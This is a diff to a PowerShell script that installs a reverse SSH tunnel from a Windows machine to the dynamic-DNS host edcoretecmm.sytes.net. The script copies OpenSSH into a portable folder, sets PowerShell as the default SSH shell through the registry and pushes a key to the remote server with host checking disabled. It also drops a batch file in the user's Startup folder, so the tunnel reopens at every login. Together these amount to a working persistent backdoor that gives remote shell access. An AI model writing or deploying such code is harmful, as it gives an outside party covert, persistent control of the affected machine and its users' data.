@@ -37,8 +37,9 @@ $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-$neutralPath = "C:\ProgramData\revssh"
-$logFile = "$neutralPath\rev_ssh.log"
+#$neutralPath = "C:\ProgramData\revssh"
+#$logFile = "$neutralPath\rev_ssh.log"
+$logFile = "$userProfile\rev_ssh.log"
 #$batFilePath = "$neutralPath\rev_ssh.bat"
 $batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
@@ -126,9 +127,17 @@ icacls.exe "$env:ProgramData\ssh\administrators_authorized_keys" /inheritance:r 
 #icacls.exe "$keyFile" /grant "${env:USERNAME}:(F)"
 #icacls.exe "$keyFile" /grant "SYSTEM:F"
 
+# Create an accesible version of ssh
+$targetPath = "C:\ProgramData\ssh_portable"
+New-Item -ItemType Directory -Path $targetPath -Force
+Copy-Item -Path "C:\Windows\System32\OpenSSH\*" -Destination $targetPath -Recurse
+
+
 # Add public key to remote server
 $publicKey = (Get-Content $pubKeyFile -Raw).Trim()
-ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+
+#ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+& "C:\ProgramData\ssh_portable\ssh.exe" -o "StrictHostKeyChecking=no" -i $keyFile "$user@$remote_host" "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 
 # Create the batch content with properly escaped quotes
 #$batContent = @"
@@ -138,18 +147,22 @@ ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ss
 #"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
 #"@
 
+# Setup powershell as default shell
+New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force
+
 # Create the batch content with properly escaped quotes
 $batContent = @"
 @echo off
-echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% using "$receivedPort" >> "$logFile"
+echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host>> "$logFile"
 timeout /t 30 /nobreak > nul
-"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
-if %ERRORLEVEL% EQU 0 (
-    echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
+""C:\ProgramData\ssh_portable\ssh.exe"" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
+if %%ERRORLEVEL%% EQU 0 (
+    echo [SUCCESS] SSH tunnel established successfully at %%date%% %%time%% >> "$logFile"
 ) else (
-    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date% %time% >> "$logFile"
+    echo [ERROR] SSH tunnel failed with error code %%ERRORLEVEL%% at %%date%% %%time%% >> "$logFile"
 )
 "@
+
 
 # Save the batch file
 Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
